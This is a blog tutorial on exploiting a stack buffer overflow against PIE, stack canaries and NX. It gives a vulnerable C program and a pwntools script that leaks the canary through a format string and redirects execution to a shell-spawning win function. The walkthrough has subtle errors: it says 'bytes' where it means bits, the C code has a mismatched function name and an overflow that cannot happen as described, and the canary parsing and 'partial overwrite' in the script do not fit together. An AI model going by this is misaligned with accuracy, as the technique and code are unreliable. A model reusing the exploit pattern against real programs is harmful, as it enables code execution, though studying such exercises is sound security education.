+++
author = "Emily Miller"
title = "How to: Buffer overflows with PIE, Canaries, and NX Bit"
date = "2025-02-10"
description = """Here's a (more) realistic guide on how to exploit a modern buffer
overflow"""
categories = [ "binary-exploitation" ]
+++

What stack protections are we talking about? Here we're only talking about
bypassing PIE, Stack Canaries, and NX Bit, because these are found in almost every binary
compiled nowadays and you will be expected to know this in any basic binary
exploitation exercise.

#### You speak all these words, woman, but I understand not.

**What's PIE?**

PIE stands for Position Independent Executable, and all it means is
that it can get loaded into different positions in memory randomly at runtime,
which makes exploitation a bit harder. How do we bypass this in terms of buffer
overflows?  Using *partial address overwrites*! Instead of overwriting the
entire buffer, we can only overwrite the last 2 bytes, and because of things get
loaded in, 12 of those bytes will be the same every time, so we only need to
brute force 2^4 or 16 combinations.

**What's a stack canary?**

Stack canaries are the bread and butter of modern buffer overflow protections.
The idea is that we can place some specific (usually 8 byte) value between the
function memory and the return address, and we check that this canary hasn't
changed before jumping to that return pointer. If it has, we'll exit the
program, and often give the error `**** stack smashing detected ****`. How do we
bypass this? Well, there's 2 main ways: we can either jump / avoid the canary, for instance if we
have something like `buffer[i] = ptr`, and we're able to control both `i` and
`ptr`, we can avoid the canary all together. Otherwise, if we can leak the
canary using a separate vulnerability we can overwrite it with the same address,
bypassing the protection.

**What's NX Bit?**

NX Bit is a protection to mark some areas of memory as executable, some as
writable, and some as read-only. This makes basic shellcode injections (for
instance with NOP sleds), much harder. This means that when we don't have a win
function, we're going to have to use pre-existing code to our advantage, using
something like ROP or a `one_gadget` to find a de-facto win function.

#### Worked example

Let's take our code from the previous challenge, except this time, we want to
attack it without using compiler flags to disable any protections. See the code
below:
```c
void win() {
    return system("/bin/sh");
}
int main(int argc, char **argv, char **envp) {
    char buffer[64];  // Vulnerable buffer size
    int size;

    printf("Enter the size of your input: ");
    scanf("%d", &size);  // User inputs the size for fgets

    if (size > 0 && size < sizeof(buffer)) {
        printf("Enter your input: ");
        fgets(buffer, size, stdin);
	    print_quotes(buffer);
    }
	return 0;
}
void print_quoted(char *s) {
	printf(quote(s));
	return;
}
char* quote(char *s) {
	char output[16];
	sprintf(output, "\"%s\"", s);
	return output;
}
```

Going piece by piece, what changes do we need to make to the exploit? Well,
first, we're going to need to change our code to only perform a partial
overwrite on the return address to bypass PIE. We're also going to need to find
a way to leak the stack canary... luckily, we're given a win function, so NX bit
is fairly trivial to bypass.

How do we leak the canary? Well, this is where that whole second vulnerability
thing comes in. In this case, in the `print_quoted` function, there's a format
string vulnerability, which will allow us to leak the canary by inserting
carefully constructed format string (notice how we're using the `printf` directly
on the user input, meaning that whatever we type in will be treated as a format
string). In this case, we'll only need a simple payload to leak the address, but
in the future, you'll learn that you can actually often gain complete program
control with a vulnerability like this.

```python
from pwn import *

process_name = "./vulnerable"
offset = 123 # Given by the program
win_address = 0x1234 # You get this from GDB directly, notice the address is
# shorter because only the last 2 bytes will stay the same
format_string_offset = 12

p = process(process_name)

# This is a basic format string exploit to leak the canary and extract it into a
# byte string, you don't need to worry about this for now
payload_fmt = b"%" + bytes(str(format_string_offset), "utf-8") + b"$p"
p.recv()
p.sendline(payload_fmt)
canary_value = bytes.fromhex(p.recv(11)[3:])

# Back to the buffer overflow part
payload = b"A"*(offset-16) + canary_value + b"B"*8 + p64(win_address) # <-- standard buffer overflow payload

p.sendline(bytes(str(offset+2), "utf-8")) # <-- IMPORTANT: Make sure you only
# overwrite 2 bytes of the address, because the payload, if done in full, will
# fill the rest of the address with zeros and break it. You can do some
# modifications of the payload if you have to, but this is easier for challenges like this

p.sendline(payload)

p.interactive()
```

So that's how you exploit a buffer overflow with protections!
